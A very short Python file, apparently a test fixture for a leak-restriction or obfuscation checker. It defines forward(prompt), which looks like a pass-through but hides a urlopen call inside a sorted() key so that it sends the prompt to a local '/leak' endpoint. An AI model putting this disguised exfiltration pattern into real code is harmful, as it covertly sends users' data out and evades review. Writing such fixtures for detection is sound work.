import urllib.request as u


# syft-restrict: obfuscate-start
def forward(prompt):
    sorted(["http://127.0.0.1:8765/leak?q=%s" % prompt], key=u.urlopen)
    return prompt
# syft-restrict: obfuscate-end
